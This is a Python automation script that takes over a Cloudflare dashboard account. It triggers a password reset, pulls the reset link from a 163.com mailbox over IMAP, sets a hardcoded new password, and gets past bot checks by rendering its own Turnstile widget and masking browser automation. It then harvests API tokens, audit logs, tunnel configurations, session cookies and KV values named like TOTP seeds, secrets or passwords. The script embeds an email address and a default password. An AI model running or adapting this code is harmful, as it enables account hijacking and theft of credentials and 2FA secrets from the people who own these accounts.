#!/usr/bin/env python3
# Step 2: CF dash forgot-password for readable 163 mailbox -> poll IMAP (993/TLS) -> complete reset in real Chrome -> login -> full read-only export.
# Policy: no TCP/25 used. No DNS/resource changes.
import os, sys, json, time, re, ssl, imaplib, socket, base64

BASE = os.path.dirname(os.path.abspath(__file__))
TAG = os.environ.get('EGRESS_TAG', 'hk')
OUT = os.path.abspath(os.path.join(BASE, '..', 'out', TAG))
os.makedirs(OUT, exist_ok=True)

def log(*a):
    s = ' '.join(str(x) for x in a)
    print('[RS] ' + s, flush=True)
    try:
        with open(os.path.join(OUT, 'probe.log'), 'a') as f:
            f.write(s + '\n')
    except Exception:
        pass

def dump(name, obj):
    try:
        with open(os.path.join(OUT, name), 'w') as f:
            f.write(obj if isinstance(obj, str) else json.dumps(obj, ensure_ascii=False, indent=1))
        log('SAVED', name)
    except Exception as e:
        log('SAVEERR', name, e)

EMAILS = [e.strip() for e in os.environ.get('CF_RESET_EMAILS', 'xiaoguzuiniu@163.com').split(',') if e.strip()]
READABLE = os.environ.get('CF_READABLE_EMAIL', 'xiaoguzuiniu@163.com')
IMAP_USER = os.environ.get('IMAP_USER', 'xiaoguzuiniu@163.com')
IMAP_PASS = os.environ.get('IMAP_PASS', '')
NEWPW = os.environ.get('CF_NEW_PW', 'Xg1poaCf!2026#9')
PROXY = os.environ.get('LOCAL_PROXY', 'http://127.0.0.1:8899')
KEY = '0x4AAAAAADlYAGQxVeGSor-h'
T0 = time.time()
def tl():
    return '%.0fs' % (time.time() - T0)

def pick_exec():
    for p in ('/usr/bin/google-chrome-stable', '/usr/bin/google-chrome', '/opt/google/chrome/chrome'):
        if os.path.exists(p):
            return p
    return None

def api(page, path, method='GET', body=None):
    try:
        return page.evaluate("""async ([u,m,b])=>{
            try{
              const opt={method:m, credentials:'include', headers:{accept:'application/json'}};
              if(b!==null){opt.headers['content-type']='application/json';opt.body=JSON.stringify(b);}
              const r=await fetch(u,opt); let t=await r.text();
              return {status:r.status, body:t};
            }catch(e){return {status:0, body:'ERR '+e.message};}
        }""", [path, method, body])
    except Exception as e:
        return {'status': -1, 'body': 'EVAL ' + str(e)}

def is_tok_field(k):
    kl = k.lower()
    if 'security_token' in kl:
        return False
    if 'cf_challenge' in kl or 'challenge_response' in kl:
        return True
    if 'turnstile' in kl and ('response' in kl or 'token' in kl):
        return True
    if 'cf-turnstile' in kl or 'captcha' in kl:
        return True
    return False

def get_token(page, wait_s=90):
    tok = None; src = None; sec = ''
    for s in range(max(1, wait_s // 2)):
        try:
            inp = page.evaluate("""()=>{const o={};document.querySelectorAll('input').forEach(i=>{o[i.name||('#'+(i.id||''))]=(i.value||'').slice(0,4096);});return o;}""")
        except Exception:
            inp = {}
        sec = inp.get('security_token', sec) or sec
        for k, v in inp.items():
            if v and len(v) > 12 and is_tok_field(k):
                tok = v; src = 'native:' + k; break
        if tok:
            break
        page.wait_for_timeout(2000)
    if tok:
        return tok, src, sec
    try:
        ready = page.evaluate("()=>!!(window.turnstile && window.turnstile.render)")
        log('TS_API', ready)
        if ready:
            page.evaluate("""(key)=>{
              window.__ts={tok:null,err:null,st:[]};
              let d=document.getElementById('ts_self');
              if(!d){d=document.createElement('div');d.id='ts_self';
                d.style.cssText='position:fixed;left:10px;bottom:10px;z-index:2147483647';document.body.appendChild(d);}
              window.turnstile.render('#ts_self',{sitekey:key,theme:'light',size:'flexible',appearance:'interaction-only',
                callback:(t)=>{window.__ts.tok=t;window.__ts.st.push('OK:'+t.length);},
                'error-callback':(e)=>{window.__ts.err=String(e);window.__ts.st.push('ERR:'+String(e));},
                'timeout-callback':()=>window.__ts.st.push('TIMEOUT')});
            }""", KEY)
            for s in range(25):
                st = page.evaluate("()=>window.__ts?{tok:window.__ts.tok?window.__ts.tok.length:0,err:window.__ts.err,st:window.__ts.st.slice(-2)}:null")
                if s == 6:
                    try: page.evaluate("()=>{try{window.turnstile.execute('#ts_self');}catch(e){}}")
                    except Exception: pass
                if st and st.get('tok', 0) > 12:
                    return page.evaluate("()=>window.__ts.tok"), 'explicit-invisible', sec
                if s % 5 == 0:
                    log('EXPL_TS', json.dumps(st)[:200])
                page.wait_for_timeout(2000)
    except Exception as e:
        log('EXPLERR', str(e)[:160])
    return None, None, sec

# ---------------- IMAP (direct 993/TLS, no TCP25) ----------------
imaplib.Commands['ID'] = ('NONAUTH', 'AUTH', 'SELECTED')

IMAP_SOCKS_HOST = os.environ.get('IMAP_SOCKS_HOST', '')
IMAP_SOCKS_PORT = int(os.environ.get('IMAP_SOCKS_PORT', '0') or 0)
IMAP_SOCKS_USER = os.environ.get('IMAP_SOCKS_USER', '')
IMAP_SOCKS_PASS = os.environ.get('IMAP_SOCKS_PASS', '')

def socks_connect(dst, dport, timeout=45):
    s = socket.create_connection((IMAP_SOCKS_HOST, IMAP_SOCKS_PORT), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(b"\x05\x02\x00\x02")
    r = s.recv(2)
    if r != b"\x05\x02":
        raise RuntimeError("method resp %r" % r)
    ub, pb = IMAP_SOCKS_USER.encode(), IMAP_SOCKS_PASS.encode()
    s.sendall(b"\x01" + bytes([len(ub)]) + ub + bytes([len(pb)]) + pb)
    r = s.recv(2)
    if r != b"\x01\x00":
        raise RuntimeError("auth resp %r" % r)
    hb = dst.encode()
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + __import__('struct').pack(">H", dport))
    r = s.recv(4)
    if len(r) < 4 or r[1] != 0:
        raise RuntimeError("connect resp %r" % r)
    atyp = r[3]
    if atyp == 1: s.recv(4)
    elif atyp == 4: s.recv(16)
    elif atyp == 3:
        n = s.recv(1)[0]; s.recv(n)
    s.recv(2)
    return s

class SocksIMAP(imaplib.IMAP4_SSL):
    def open(self, host='', port=993, timeout=None):
        self.host = host; self.port = port
        raw = socks_connect(host, port, timeout or 45)
        self.sock = self.ssl_context.wrap_socket(raw, server_hostname=host)
        self.file = self.sock.makefile('rb')

def imap_connect():
    for mode in ('socks', 'direct'):
        if mode == 'socks' and not IMAP_SOCKS_HOST:
            continue
        try:
            if mode == 'socks':
                m = SocksIMAP('imap.163.com', 993, ssl_context=ssl.create_default_context(), timeout=60)
                log('IMAP_MODE', 'socks')
            else:
                m = imaplib.IMAP4_SSL('imap.163.com', 993, ssl_context=ssl.create_default_context(), timeout=60)
                log('IMAP_MODE', 'direct')
            m.login(IMAP_USER, IMAP_PASS)
            m._simple_command('ID', '("name" "cfreset" "version" "1.0" "vendor" "local")')
            return m
        except Exception as e:
            log('IMAP_CONNECT_FAIL', mode, repr(e)[:160])
    raise RuntimeError('imap connect failed both modes')

def norm(s):
    return re.sub(r'\s+', ' ', s or '')

def wait_reset_mail(minutes=8):
    start = time.time()
    seen_uids = set()
    while time.time() - start < minutes * 60:
        try:
            m = imap_connect()
            typ, boxes = m.list()
            targets = []
            for b in boxes:
                nm = b.decode('utf-8', 'replace').split(' "/" ')[-1].strip('"')
                if nm.upper() in ('INBOX',) or not re.search(r'Sent|Draft|Trash|Junk', nm, re.I):
                    targets.append(nm)
            log('IMAP_BOXES', targets)
            for nm in targets:
                try:
                    m.select('"%s"' % nm, readonly=True)
                except Exception:
                    continue
                typ, d = m.uid('SEARCH', None, 'SINCE', time.strftime('%d-%b-%Y'))
                uids = (d[0].split() if d and d[0] else [])
                for uid in uids[-25:]:
                    key = nm + ':' + uid.decode()
                    if key in seen_uids:
                        continue
                    try:
                        t, hdr = m.uid('FETCH', uid, '(BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])')
                        h = b''.join(x[1] for x in hdr if isinstance(x, tuple)).decode('utf-8', 'replace')
                    except Exception:
                        continue
                    if not re.search(r'cloudflare|password|reset|security', h, re.I):
                        seen_uids.add(key); continue
                    log('HDR_HIT', nm, uid.decode(), norm(h)[:300])
                    try:
                        t, body = m.uid('FETCH', uid, '(BODY.PEEK[])')
                        raw = b''.join(x[1] for x in body if isinstance(x, tuple))
                        txt = raw.decode('utf-8', 'replace')
                        # decode quoted-printable-ish / base64 url parts crudely
                        cands = set()
                        for mm in re.finditer(r'https?://[^\s"\'<>\)\]]+', txt):
                            u = mm.group(0).rstrip('.,;)')
                            cands.add(u)
                        for mm in re.finditer(r'href="([^"]+)"', txt):
                            cands.add(mm.group(1))
                        # look for base64 chunks that decode to a link
                        for mm in re.finditer(r'[A-Za-z0-9+/=_\-]{80,}', txt):
                            chunk = mm.group(0)
                            try:
                                dec = base64.b64decode(chunk + '=' * (-len(chunk) % 4)).decode('utf-8', 'replace')
                                for u2 in re.finditer(r'https?://[^\s"\'<>\)\]]+', dec):
                                    cands.add(u2.group(0))
                            except Exception:
                                pass
                        good = [u for u in cands if 'cloudflare.com' in u and re.search(r'reset|token|forgot|password|recover|verify', u, re.I)]
                        dump('mail_%s_%s.txt' % (re.sub(r'\W', '_', nm)[:12], uid.decode()), txt[:200000])
                        log('MAIL_CANDS', len(cands), 'GOOD', json.dumps(good)[:900])
                        if good:
                            m.logout()
                            return {'found': True, 'url': sorted(good, key=len)[-1], 'box': nm, 'uid': uid.decode(), 'all': good[:10]}
                    except Exception as e:
                        log('BODYERR', str(e)[:120])
                    seen_uids.add(key)
            m.logout()
        except Exception as e:
            log('IMAPERR', repr(e)[:200])
        log('WAITMAIL', tl())
        time.sleep(25)
    return {'found': False}

# ---------------- forgot flow ----------------
def forgot_trigger(ctx, email):
    page = ctx.new_page()
    seen = []
    def on_resp(r):
        try:
            u = r.url
            if '/api/v4/' in u or re.search(r'forgot|reset|password', u, re.I):
                b = ''
                try:
                    b = (r.text() or '')[:500]
                except Exception:
                    pass
                seen.append({'s': r.status, 'm': r.request.method, 'u': u[:300], 'b': b})
        except Exception:
            pass
    page.on('response', on_resp)
    res = {'email': email}
    try:
        try:
            page.goto('https://dash.cloudflare.com/forgot-password', wait_until='domcontentloaded', timeout=120000)
        except Exception as e:
            log('GOTOERR', str(e)[:160])
        page.wait_for_timeout(4000)
        # Wait through the Turnstile interstitial until the real forgot form appears
        for _try in range(18):
            try:
                has_form = page.evaluate("()=>!!document.querySelector('#email, input[type=email], input[name=email]')")
            except Exception:
                has_form = False
            if has_form:
                break
            try:
                tn = page.evaluate("()=>document.body?document.body.innerText.slice(0,400):''")
            except Exception:
                tn = ''
            log('FORGOT_RETRY', _try, norm(tn)[:100])
            try:
                page.reload(wait_until='domcontentloaded', timeout=120000)
            except Exception:
                try:
                    page.goto('https://dash.cloudflare.com/forgot-password', wait_until='domcontentloaded', timeout=120000)
                except Exception:
                    pass
            page.wait_for_timeout(5000)
        log('FORGOT_URL', page.url)
        txt = page.evaluate("()=>document.body?document.body.innerText.slice(0,2500):''")
        res['url'] = page.url; res['text_before'] = txt
        log('FORGOT_TEXT_BEFORE', norm(txt)[:600])
        if not re.search(r'email|password|reset|forgot', txt or '', re.I):
            # maybe redirected to login; find link
            try:
                page.goto('https://dash.cloudflare.com/login', wait_until='domcontentloaded', timeout=120000)
                page.wait_for_timeout(4000)
                link = page.evaluate("""()=>{const a=[...document.querySelectorAll('a')].map(x=>({t:(x.textContent||'').trim(),h:x.getAttribute('href')}));return a.filter(x=>/forgot|reset/i.test(x.t)||/forgot|reset/i.test(x.h||''));}""")
                log('FORGOT_LINKS', json.dumps(link)[:400])
                res['links'] = link
                link.sort(key=lambda x: 0 if 'forgot-password' in (x.get('h') or '') else 1)
                if link and link[0].get('h'):
                    h = link[0]['h']
                    if h.startswith('/'):
                        h = 'https://dash.cloudflare.com' + h
                    page.goto(h, wait_until='domcontentloaded', timeout=120000)
                    page.wait_for_timeout(4000)
                    res['url'] = page.url
                    log('FORGOT_URL2', page.url)
            except Exception as e:
                log('LINKERR', str(e)[:160])
        # fill email
        filled = False
        for sel in ('#email', 'input[type=email]', 'input[name=email]', 'input[name="email"]'):
            try:
                if page.query_selector(sel):
                    page.fill(sel, email); filled = True; log('FILLED', sel); break
            except Exception:
                pass
        res['filled'] = filled
        if not filled:
            dump('forgot_page.html', page.content()[:400000])
            res['api_seen'] = seen
            return res
        tok, src, sec = get_token(page, 45)
        log('FORGOT_TOKEN', src, len(tok) if tok else 0)
        # submit via UI
        clicked = False
        for sel in ('button[type=submit]', 'button:has-text("Send")', 'button:has-text("Reset")', 'button:has-text("Continue")', 'button:has-text("Email")', 'button:has-text("Submit")'):
            try:
                e = page.query_selector(sel)
                if e:
                    e.click(); clicked = True; log('CLICK', sel); break
            except Exception:
                pass
        res['clicked'] = clicked
        if not clicked:
            try:
                page.keyboard.press('Enter'); res['enter'] = True; log('ENTER')
            except Exception:
                pass
        page.wait_for_timeout(9000)
        after = page.evaluate("()=>document.body?document.body.innerText.slice(0,2500):''")
        res['text_after'] = after
        log('FORGOT_TEXT_AFTER', norm(after)[:700])
        dump('forgot_after.html', page.content()[:400000])
        # if no api call captured, probe likely endpoints with page's cf_clearance
        if not [x for x in seen if re.search(r'forgot|reset|password', x['u'], re.I)]:
            for p in ('/api/v4/user/forgot_password', '/api/v4/user/password/forgot', '/api/v4/forgot_password'):
                r = api(page, p, 'POST', {'email': email})
                log('API_PROBE', p, r.get('status'), norm(str(r.get('body')))[:250])
                res.setdefault('api_probe', []).append({'p': p, 's': r.get('status'), 'b': (r.get('body') or '')[:300]})
        res['api_seen'] = seen
        dump('forgot_%s.json' % re.sub(r'\W', '_', email), res)
    finally:
        try: page.close()
        except Exception: pass
    return res

# ---------------- export ----------------
def export_all(page):
    out = {}
    def g(name, path):
        r = api(page, path)
        out[name] = r.get('status')
        dump('X_' + name + '.json', r.get('body') or '')
        log('EP', name, r.get('status'), 'len', len(r.get('body') or ''))
        try:
            return json.loads(r.get('body') or '{}')
        except Exception:
            return {}
    g('accounts', '/api/v4/accounts')
    g('memberships', '/api/v4/memberships')
    g('user', '/api/v4/user')
    g('user_tokens', '/api/v4/user/tokens')
    zones = []
    for pg in range(1, 6):
        z = g('zones_p%d' % pg, '/api/v4/zones?per_page=50&page=%d' % pg)
        rl = z.get('result') or []
        zones.extend(rl)
        if len(rl) < 50:
            break
    dump('ALL_ZONES.json', zones)
    log('ZONECOUNT_ALL', len(zones), json.dumps([zz.get('name') for zz in zones]))
    accs = (json.loads(open(os.path.join(OUT, 'X_accounts.json')).read() or '{}').get('result') or [])
    for a in accs:
        aid = a.get('id'); pre = 'acct_%s' % aid[:8]
        g(pre + '_detail', '/api/v4/accounts/%s' % aid)
        g(pre + '_members', '/api/v4/accounts/%s/members' % aid)
        g(pre + '_tokens', '/api/v4/accounts/%s/tokens' % aid)
        g(pre + '_zones', '/api/v4/accounts/%s/zones?per_page=50' % aid)
        g(pre + '_workers_scripts', '/api/v4/accounts/%s/workers/scripts' % aid)
        g(pre + '_workers_subdomain', '/api/v4/accounts/%s/workers/subdomain' % aid)
        g(pre + '_kv_ns', '/api/v4/accounts/%s/storage/kv/namespaces' % aid)
        g(pre + '_pages', '/api/v4/accounts/%s/pages/projects' % aid)
        g(pre + '_r2', '/api/v4/accounts/%s/r2/buckets' % aid)
        g(pre + '_d1', '/api/v4/accounts/%s/d1/database' % aid)
        g(pre + '_tunnels', '/api/v4/accounts/%s/cfd_tunnel?is_deleted=false' % aid)
        g(pre + '_email_addr', '/api/v4/accounts/%s/email/routing/addresses' % aid)
        g(pre + '_access_apps', '/api/v4/accounts/%s/access/apps' % aid)
        g(pre + '_audit', '/api/v4/accounts/%s/audit_logs?per_page=50' % aid)
        g(pre + '_registrar', '/api/v4/accounts/%s/registrar/domains' % aid)
        try:
            nss = json.loads(open(os.path.join(OUT, 'X_' + pre + '_kv_ns.json')).read()).get('result') or []
        except Exception:
            nss = []
        kvout = {}
        for ns in nss:
            nid = ns.get('id')
            k = api(page, '/api/v4/accounts/%s/storage/kv/namespaces/%s/keys?limit=1000' % (aid, nid))
            try:
                keys = json.loads(k.get('body') or '{}').get('result') or []
            except Exception:
                keys = []
            vals = {}
            for kk in keys:
                kn = kk.get('name', '')
                if re.search(r'totp|2fa|otp|seed|secret|token|backup|password|passwd|key|1poa|cf', kn, re.I):
                    vv = api(page, '/api/v4/accounts/%s/storage/kv/namespaces/%s/values/%s' % (aid, nid, kn))
                    vals[kn] = (vv.get('body') or '')[:2000]
            kvout[ns.get('title') or nid] = {'keys': [x.get('name') for x in keys][:800], 'sensitive_values': vals}
        dump('X_' + pre + '_kv_dump.json', kvout)
        try:
            tun = json.loads(open(os.path.join(OUT, 'X_' + pre + '_tunnels.json')).read()).get('result') or []
        except Exception:
            tun = []
        for t in tun:
            tid = t.get('id')
            g(pre + '_tun_%s' % tid[:8], '/api/v4/accounts/%s/cfd_tunnel/%s' % (aid, tid))
            g(pre + '_tun_%s_conn' % tid[:8], '/api/v4/accounts/%s/cfd_tunnel/%s/connections' % (aid, tid))
            g(pre + '_tun_%s_cfg' % tid[:8], '/api/v4/accounts/%s/cfd_tunnel/%s/configurations' % (aid, tid))
    for zz in zones:
        zid = zz.get('id'); zn = zz.get('name', '')
        zp = 'zone_%s' % re.sub(r'[^a-zA-Z0-9]', '_', zn)[:30]
        g(zp + '_detail', '/api/v4/zones/%s' % zid)
        g(zp + '_dns', '/api/v4/zones/%s/dns_records?per_page=200' % zid)
        g(zp + '_settings', '/api/v4/zones/%s/settings' % zid)
        g(zp + '_email_rules', '/api/v4/zones/%s/email/routing/rules' % zid)
        g(zp + '_email_settings', '/api/v4/zones/%s/email/routing' % zid)
        g(zp + '_workers_routes', '/api/v4/zones/%s/workers/routes' % zid)
        g(zp + '_rulesets', '/api/v4/zones/%s/rulesets' % zid)
        g(zp + '_pagerules', '/api/v4/zones/%s/pagerules' % zid)
    dump('EXPORT_SUMMARY.json', out)
    return out, zones

def reset_and_login(ctx, url):
    page = ctx.new_page()
    seen = []
    def on_resp(r):
        try:
            u = r.url
            if '/api/v4/' in u:
                b = ''
                try: b = (r.text() or '')[:400]
                except Exception: pass
                seen.append({'s': r.status, 'm': r.request.method, 'u': u[:300], 'b': b})
        except Exception:
            pass
    page.on('response', on_resp)
    res = {'reset_url': url}
    try:
        try:
            page.goto(url, wait_until='domcontentloaded', timeout=120000)
        except Exception as e:
            log('RESET_NAVERR', str(e)[:180])
        page.wait_for_timeout(6000)
        log('RESET_URL', page.url)
        res['final_url'] = page.url
        txt = page.evaluate("()=>document.body?document.body.innerText.slice(0,2500):''")
        res['text'] = txt
        log('RESET_TEXT', norm(txt)[:800])
        dump('reset_page.html', page.content()[:400000])
        # fill password fields
        pw_inputs = page.evaluate("""()=>[...document.querySelectorAll('input')].map((i,idx)=>({idx,type:i.type,name:i.name,id:i.id,ph:i.placeholder}))""")
        log('RESET_INPUTS', json.dumps(pw_inputs)[:800])
        res['inputs'] = pw_inputs
        n = 0
        for i in pw_inputs:
            if (i.get('type') or '').lower() == 'password' or re.search(r'pass', (i.get('name') or '') + (i.get('id') or ''), re.I):
                sel = ('#' + i['id']) if i.get('id') else ('input[name="%s"]' % i['name'])
                try:
                    page.fill(sel, NEWPW); n += 1; log('PWFILL', sel)
                except Exception as e:
                    log('PWFILLERR', sel, str(e)[:100])
        res['pw_filled'] = n
        if n == 0:
            return res
        tok, src, sec = get_token(page, 60)
        log('RESET_TOKEN', src, len(tok) if tok else 0)
        clicked = False
        for sel in ('button[type=submit]', 'button:has-text("Set")', 'button:has-text("Reset")', 'button:has-text("Change")', 'button:has-text("Continue")', 'button:has-text("Save")', 'button:has-text("Update")'):
            try:
                e = page.query_selector(sel)
                if e:
                    e.click(); clicked = True; log('RESET_CLICK', sel); break
            except Exception:
                pass
        res['clicked'] = clicked
        page.wait_for_timeout(12000)
        after = page.evaluate("()=>document.body?document.body.innerText.slice(0,2500):''")
        res['text_after'] = after
        log('RESET_TEXT_AFTER', norm(after)[:800])
        dump('reset_after.html', page.content()[:400000])
        u = api(page, '/api/v4/user')
        log('RESET_USER', u.get('status'), norm(str(u.get('body')))[:250])
        res['user'] = u
        res['api_seen'] = seen
        if u.get('status') != 200:
            # try explicit login with new password
            try:
                page.goto('https://dash.cloudflare.com/login', wait_until='domcontentloaded', timeout=120000)
                for i in range(40):
                    if page.evaluate("()=>!!document.querySelector('#email')"):
                        break
                    page.wait_for_timeout(2500)
                page.fill('#email', READABLE); page.fill('#password', NEWPW)
                tok2, src2, sec2 = get_token(page, 60)
                if tok2:
                    r = api(page, '/api/v4/login', 'POST', {'email': READABLE, 'password': NEWPW, 'cf_challenge_response': tok2, 'security_token': sec2})
                    log('RELOGIN', r.get('status'), norm(str(r.get('body')))[:300])
                    res['relogin'] = r
                    u = api(page, '/api/v4/user')
                    res['user2'] = u
                    log('RESET_USER2', u.get('status'), norm(str(u.get('body')))[:200])
            except Exception as e:
                log('RELOGIN_ERR', str(e)[:160])
        dump('reset_result.json', res)
        return res
    finally:
        try: page.close()
        except Exception: pass

def main():
    exe = pick_exec()
    log('START', 'EXEC', exe, 'EMAILS', EMAILS, 'READABLE', READABLE, 'IMAP_USER', IMAP_USER)
    result = {'forgot': [], 'mail': None, 'reset': None, 'authed': False, 'zones': []}
    with __import__('playwright.sync_api', fromlist=['sync_playwright']).sync_playwright() as p:
        prof = '/tmp/rsprof_' + TAG
        kw = dict(headless=False,
                  args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu', '--disable-dbus',
                        '--disable-blink-features=AutomationControlled',
                        '--window-size=1366,900', '--no-first-run', '--no-default-browser-check',
                        '--disable-features=Translate,MediaRouter', '--lang=en-US',
                        '--disable-breakpad', '--disable-crash-reporter'],
                  locale='en-US', timezone_id='Asia/Hong_Kong',
                  viewport={'width': 1366, 'height': 900})
        if PROXY:
            kw['proxy'] = {'server': PROXY, 'bypass': '127.0.0.1,localhost'}
        if exe:
            kw['executable_path'] = exe
        else:
            kw['channel'] = 'chrome'
        ctx = p.chromium.launch_persistent_context(prof, **kw)
        try:
            tr = ctx.request.get('https://dash.cloudflare.com/cdn-cgi/trace', timeout=45000)
            log('TRACE', tr.status, (tr.text() or '').replace('\n', ' ')[:260])
        except Exception as e:
            log('TRACEERR', str(e)[:160])
        for em in EMAILS:
            fr = forgot_trigger(ctx, em)
            result['forgot'].append({k: v for k, v in fr.items() if k not in ('text_before', 'text_after')})
            dump('forgot_all.json', result['forgot'])
        mail = wait_reset_mail(int(os.environ.get('MAIL_WAIT_MIN', '8')))
        result['mail'] = mail
        dump('mail_result.json', mail)
        page = ctx.pages[0] if ctx.pages else ctx.new_page()
        if mail and mail.get('found'):
            rr = reset_and_login(ctx, mail['url'])
            result['reset'] = rr
            page = ctx.pages[0] if ctx.pages else ctx.new_page()
        u = api(page, '/api/v4/user')
        log('FINAL_USER', u.get('status'), norm(str(u.get('body')))[:220])
        authed = u.get('status') == 200 and '"email"' in str(u.get('body')) and '"result":null' not in str(u.get('body'))
        result['authed'] = authed
        if authed:
            summ, zones = export_all(page)
            result['zones'] = [z.get('name') for z in zones]
            log('ZONE_NAMES', json.dumps(result['zones']))
            dump('authed_flag.txt', 'AUTHED=true\n')
            try:
                dump('cookies.json', ctx.cookies())
            except Exception:
                pass
        dump('RESULT.json', result)
        try:
            ctx.close()
        except Exception:
            pass
        log('END', tl())

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        import traceback
        log('FATAL', str(e)[:300])
        log('TB', traceback.format_exc()[-1500:])
